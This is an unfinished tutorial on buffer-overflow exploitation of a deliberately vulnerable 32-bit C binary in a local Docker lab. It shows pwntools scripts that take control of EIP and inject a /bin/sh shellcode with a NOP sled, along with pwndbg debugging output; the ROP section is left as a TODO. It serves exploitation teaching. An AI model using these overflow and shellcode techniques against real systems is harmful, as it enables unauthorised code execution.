\newpage

## WIP: Bypassing NX with Return Oriented Programming

In this tutorial we'll review how to bypass a "No eXecute" (NX) flag within a binary.

Also known as Data Execution Prevention (DEP), this protection marks writable regions of memory as non-executable. This prevents the processor from executing in these marked regions of memory.

----

**Note**: as in previous tutorials, there's a docker container that facilitates reproducing the work of this tutorial. The container can be built with:
```bash
docker build -t basic_cybersecurity10:latest .
```
and run with:
```bash
docker run --privileged -v $(pwd):/root/tutorial -it basic_cybersecurity10:latest
```

----

#### Enabling NX

Following content is heavily inspired on [1,2]:

```C
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>

void vuln() {
    char buffer[128];
    char * second_buffer;
    uint32_t length = 0;
    puts("Reading from STDIN");
    read(0, buffer, 1024);

    if (strcmp(buffer, "Cool Input") == 0) {
        puts("What a cool string.");
    }
    length = strlen(buffer);
    if (length == 42) {
        puts("LUE");
    }
    second_buffer = malloc(length);
    strncpy(second_buffer, buffer, length);
}

int main() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    puts("This is a big vulnerable example!");
    printf("I can print many things: %x, %s, %d\n", 0xdeadbeef, "Test String",
            42);
    write(1, "Writing to STDOUT\n", 18);
    vuln();
}
```

When compiling this code we'll aim to mark the writable regions of memory as non-executable.
According to the original source [1], the resulting binary isn't big enough to perform
ROP attacks. Let's see:

```bash
root@9a78bba9592e:~/tutorial# pwd
/root/tutorial
root@9a78bba9592e:~/tutorial# gcc -m32 -g -fno-stack-protector -znoexecstack -o ./build/1_nx ./src/1_staticnx.c
root@9a78bba9592e:~/tutorial# ls -lh build/1_nx
-rwxr-xr-x 1 root root 7.6K Jun 18 17:49 build/1_nx
```

So what we do instead is compiling it as a statically linked ELF. This should include library code in the final executable and bulk up the size of the binary.
```
root@9a78bba9592e:~/tutorial# gcc -m32 -g -fno-stack-protector -static -znoexecstack -o ./build/1_staticnx ./src/1_staticnx.c
root@9a78bba9592e:~/tutorial# ls -lh build/1_
1_nx        1_staticnx  
root@9a78bba9592e:~/tutorial# ls -lh build/1_
1_nx        1_staticnx  
root@9a78bba9592e:~/tutorial# ls -lh build/1_staticnx
-rwxr-xr-x 1 root root 729K Jun 18 17:51 build/1_staticnx
```

There's indeed a big difference between them.

Checking the security of these files indeed deliver an active NX flag:
```bash
root@9a78bba9592e:~/tutorial# checksec build/1_*
[*] '/root/tutorial/build/1_nx'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[*] '/root/tutorial/build/1_staticnx'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

#### Obtaining EIP Control
Let's build a exploit to take control of the instructions pointer. A first skeleton is presented below:

```Python
#!/usr/bin/python

from pwn import *

def main():
    # Start the process
    p = process("../build/1_staticnx")

    # Craft the payload
    payload = "A"*148 + p32(0xdeadc0de)
    payload = payload.ljust(1000, "\x00")

    # Print the process id
    raw_input(str(p.proc.pid))

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
```

Which you can run through:

```bash
root@9a78bba9592e:~/tutorial/scripts# python 1_skeleton.py
[+] Starting local process '../build/1_staticnx': pid 89
89
[*] Switching to interactive mode
This is a big vulnerable example!
I can print many things: deadbeef, Test String, 42
Writing to STDOUT
Reading from STDIN
[*] Got EOF while reading in interactive
$
[*] Process '../build/1_staticnx' stopped with exit code -11 (SIGSEGV) (pid 89)
[*] Got EOF while sending in interactive
```

Note that the instruction
```python
# Print the process id
raw_input(str(p.proc.pid))
```

in the script was placed there to launch a gdb instance in another terminal. Let's go for it then.
In another terminal, we connect to the docker container through:

```bash
$ docker ps
CONTAINER ID        IMAGE                         COMMAND             CREATED             STATUS              PORTS               NAMES
9a78bba9592e        basic_cybersecurity10:latest   "/bin/bash"         About an hour ago   Up About an hour                        heuristic_gates
victor at Victors-MacBook in ~/web on bounties*
$ docker exec -it 9a78bba9592e bash
root@9a78bba9592e:~#
```
now we proceed as follows:

```bash

# Terminal 1
root@9a78bba9592e:~/tutorial/scripts# python 1_skeleton.py
[+] Starting local process '../build/1_staticnx': pid 123
123

# Terminal 2
root@9a78bba9592e:~# gdb -p 123
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
pwndbg: loaded 162 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Attaching to process 123
Reading symbols from /root/tutorial/build/1_staticnx...(no debugging symbols found)...done.
0xf7790b49 in __kernel_vsyscall ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
[ REGISTERS ]
 EAX  0xfffffe00
 EBX  0x0
 ECX  0xff81e348 ◂— 0x21 /* '!' */
 EDX  0x400
 EDI  0x4e
 ESI  0x80ef00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069d70 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 EBP  0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000
 ESP  0xff81e318 —▸ 0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000
 EIP  0xf7790b49 (__kernel_vsyscall+9) ◂— pop    ebp
[ DISASM ]
 ► 0xf7790b49 <__kernel_vsyscall+9>     pop    ebp
   0xf7790b4a <__kernel_vsyscall+10>    pop    edx
   0xf7790b4b <__kernel_vsyscall+11>    pop    ecx
   0xf7790b4c <__kernel_vsyscall+12>    ret    
    ↓
   0x80710c2  <__read_nocancel+24>      pop    ebx
   0x80710c3  <__read_nocancel+25>      cmp    eax, 0xfffff001
   0x80710c8  <__read_nocancel+30>      jae    __syscall_error <0x8074610>
    ↓
   0x8074610  <__syscall_error>         mov    edx, 0xffffffe8
   0x8074616  <__syscall_error+6>       neg    eax
   0x8074618  <__syscall_error+8>       mov    dword ptr gs:[edx], eax
   0x807461b  <__syscall_error+11>      mov    eax, 0xffffffff
[ STACK ]
00:0000│ esp  0xff81e318 —▸ 0xff81e3d8 —▸ 0xff81e3e8 ◂— 0x1000
01:0004│      0xff81e31c ◂— 0x400
02:0008│      0xff81e320 —▸ 0xff81e348 ◂— 0x21 /* '!' */
03:000c│      0xff81e324 —▸ 0x80710c2 (__read_nocancel+24) ◂— pop    ebx
04:0010│      0xff81e328 —▸ 0x80481b0 (_init) ◂— push   ebx
05:0014│      0xff81e32c —▸ 0x80488d2 (vuln+54) ◂— add    esp, 0x10
06:0018│      0xff81e330 ◂— 0x0
07:001c│      0xff81e334 —▸ 0xff81e348 ◂— 0x21 /* '!' */
[ BACKTRACE ]
 ► f 0 f7790b49 __kernel_vsyscall+9
   f 1  80710c2 __read_nocancel+24
   f 2  80488d2 vuln+54
   f 3  80489d2 main+123
   f 4  8048c01 generic_start_main+545
   f 5  8048dfd __libc_start_main+285
 pwndbg> b 14
 Breakpoint 1 at 0x80488d5: file ./src/1_staticnx.c, line 14.
 pwndbg> c
 Continuing.

 # Terminal 1
 # Press ENTER to get:
 [*] Switching to interactive mode
 This is a big vulnerable example!
 I can print many things: deadbeef, Test String, 42
 Writing to STDOUT
 Reading from STDIN
 $  

# Terminal 2
Breakpoint 1, vuln () at ./src/1_staticnx.c:14
14	    if (strcmp(buffer, "Cool Input") == 0) {
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────
*EAX  0x3e8
*EBX  0x80481b0 (_init) ◂— push   ebx
 ECX  0xff8094d8 ◂— 0x41414141 ('AAAA')
 EDX  0x400
 EDI  0x4e
 ESI  0x80ef00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069d70 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 EBP  0xff809568 ◂— 0x41414141 ('AAAA')
*ESP  0xff8094d0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— 0xfbad2887
*EIP  0x80488d5 (vuln+57) ◂— sub    esp, 8
──────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────
   0x80488d2 <vuln+54>    add    esp, 0x10
 ► 0x80488d5 <vuln+57>    sub    esp, 8
   0x80488d8 <vuln+60>    push   0x80bedfb
   0x80488dd <vuln+65>    lea    eax, dword ptr [ebp - 0x90]
   0x80488e3 <vuln+71>    push   eax
   0x80488e4 <vuln+72>    call   0x80482a0

   0x80488e9 <vuln+77>    add    esp, 0x10
   0x80488ec <vuln+80>    test   eax, eax
   0x80488ee <vuln+82>    jne    vuln+100 <0x8048900>

   0x80488f0 <vuln+84>    sub    esp, 0xc
   0x80488f3 <vuln+87>    push   0x80bee06
───────────────────────────────────────────────────────────────[ SOURCE (CODE) ]───────────────────────────────────────────────────────────────
    9     char * second_buffer;
   10     uint32_t length = 0;
   11     puts("Reading from STDIN");
   12     read(0, buffer, 1024);
   13
 ► 14     if (strcmp(buffer, "Cool Input") == 0) {
   15         puts("What a cool string.");
   16     }
   17     length = strlen(buffer);
   18     if (length == 42) {
   19         puts("LUE");
───────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────
00:0000│ esp  0xff8094d0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0004│      0xff8094d4 —▸ 0x80bee20 ◂— push   esp
02:0008│ ecx  0xff8094d8 ◂— 0x41414141 ('AAAA')
... ↓
─────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────
 ► f 0  80488d5 vuln+57
   f 1 deadc0de
   f 2        0
Breakpoint /root/tutorial/src/1_staticnx.c:14
```

We've breaked after the read which should get us all the stuff from the script. Now, let's inspect a bit the stack memory:

```bash
# Terminal 2
pwndbg> stack 100
00:0000│ esp  0xff8094d0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0004│      0xff8094d4 —▸ 0x80bee20 ◂— push   esp
02:0008│ ecx  0xff8094d8 ◂— 0x41414141 ('AAAA')
... ↓
27:009c│      0xff80956c ◂— 0xdeadc0de
28:00a0│      0xff809570 ◂— 0x0
... ↓
```
Analyzing the registers:
```bash
pwndbg> regs
*EAX  0x3e8
*EBX  0x80481b0 (_init) ◂— push   ebx
 ECX  0xff8094d8 ◂— 0x41414141 ('AAAA')
 EDX  0x400
 EDI  0x4e
 ESI  0x80ef00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069d70 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 EBP  0xff809568 ◂— 0x41414141 ('AAAA')
*ESP  0xff8094d0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— 0xfbad2887
*EIP  0x80488d5 (vuln+57) ◂— sub    esp, 8
```

We can see that EBP points out to `0xff809568`, which means that the return `ret` address points to `0xff80956c`. According to the memory dump above, it contains `0xdeadc0de` which we introduced as desired.

Thereby, we took control of the EIP.

#### Trying to execute a shellcode
Let's compile the program without NX protection:
```bash
gcc -m32 -g -fno-stack-protector -z execstack -static -o ./build/1_nx ./src/1_static.c
```
Which we can verify as:
```bash
root@9d3c62865471:~/tutorial# checksec build/1_static
[*] '/root/tutorial/build/1_static'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
root@9d3c62865471:~/tutorial# checksec build/1_staticnx
[*] '/root/tutorial/build/1_staticnx'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```
Now, we simply overflow it making sure we append and prepend Noops to the shellcode.
We use following script (`1_skeleton_shellcode.py`):

```python
#!/usr/bin/python
from pwn import *
# Define the context of the working machine
context(arch='i386', os='linux')

def main():
    # Start the process
    log.info("Launching the process")
    p = process("../build/1_static")

    # Get a simple shellcode
    log.info("Putting together simple shellcode")
    shellcode = asm(shellcraft.sh())
    # print(len(shellcode))
    print(asm(shellcraft.sh()))

    # Craft the payload
    log.info("Crafting the payload")
    # payload = "A"*148
    payload = "\x90"*86    # no op code
    payload += shellcode   # 44 chars
    payload += "\x90"*18    # no op code
    payload += p32(0xdeadc0de)
    # payload += "\x90"*500    # no op code
    payload = payload.ljust(2000, "\x00")
    # log.info(payload)

    # Print the process id
    raw_input(str(p.proc.pid))

    # Send the payload
    p.send(payload)

    # Transfer interaction to the user
    p.interactive()

if __name__ == '__main__':
    main()
```

which gets us a situation like:
```bash
[ SOURCE (CODE) ]
    9     char * second_buffer;
   10     uint32_t length = 0;
   11     puts("Reading from STDIN");
   12     read(0, buffer, 1024);
   13
 ► 14     if (strcmp(buffer, "Cool Input") == 0) {
   15         puts("What a cool string.");
   16     }
   17     length = strlen(buffer);
   18     if (length == 42) {
   19         puts("LUE");
[ STACK ]
00:0000│ esp  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
01:0004│      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp
02:0008│ ecx  0xff9abbe8 ◂— 0x90909090
... ↓
[ BACKTRACE ]
 ► f 0  80488d5 vuln+57
   f 1 deadc0de
   f 2        0
Breakpoint /root/tutorial/src/1_staticnx.c:14
pwndbg> stack 50
00:0000│ esp  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
01:0004│      0xff9abbe4 —▸ 0x80bee20 ◂— push   esp
02:0008│ ecx  0xff9abbe8 ◂— 0x90909090
... ↓
17:005c│      0xff9abc3c ◂— 0x686a9090
18:0060│      0xff9abc40 ◂— 0x2f2f2f68 ('h///')
19:0064│      0xff9abc44 ◂— 0x622f6873 ('sh/b')
1a:0068│      0xff9abc48 ◂— 0xe3896e69
1b:006c│      0xff9abc4c ◂— 0x1010168
1c:0070│      0xff9abc50 ◂— 0x24348101
1d:0074│      0xff9abc54 ◂— 0x1016972
1e:0078│      0xff9abc58 ◂— 0x6a51c931
1f:007c│      0xff9abc5c ◂— 0xe1015904
20:0080│      0xff9abc60 ◂— 0x31e18951
21:0084│      0xff9abc64 ◂— 0x580b6ad2
22:0088│      0xff9abc68 ◂— 0x909080cd
23:008c│      0xff9abc6c ◂— 0x90909090
... ↓
27:009c│      0xff9abc7c ◂— 0xdeadc0de
28:00a0│      0xff9abc80 ◂— 0x0
... ↓
pwndbg> regs
*EAX  0x400
*EBX  0x80481b0 (_init) ◂— push   ebx
 ECX  0xff9abbe8 ◂— 0x90909090
 EDX  0x400
 EDI  0x4e
 ESI  0x80ef00c (_GLOBAL_OFFSET_TABLE_+12) —▸ 0x8069d70 (__strcpy_sse2) ◂— mov    edx, dword ptr [esp + 4]
 EBP  0xff9abc78 ◂— 0x90909090
*ESP  0xff9abbe0 —▸ 0x80ef200 (_IO_2_1_stdout_) ◂— xchg   dword ptr [eax], ebp /* 0xfbad2887 */
*EIP  0x80488d5 (vuln+57) ◂— sub    esp, 8

```

Problem now is how to modify `0xdeadc0de` by something that falls on the Noop section

#### Code Gadgets
TODO


### Resources
- [1] Linux exploitation course. Retrieved from https://github.com/nnamon/linux-exploitation-course.
- [2] Bypassing NX with Return Oriented Programming. Retrieved from https://github.com/nnamon/linux-exploitation-course/blob/master/lessons/6_bypass_nx_rop/lessonplan.md.
- [3] pwndebug. Retrieved from https://github.com/pwndbg/pwndbg.
- [4] Why do we have to put the shellcode before the return address in the buffer overflow? Retreived from https://security.stackexchange.com/questions/101222/why-do-we-have-to-put-the-shellcode-before-the-return-address-in-the-buffer-over?rq=1.
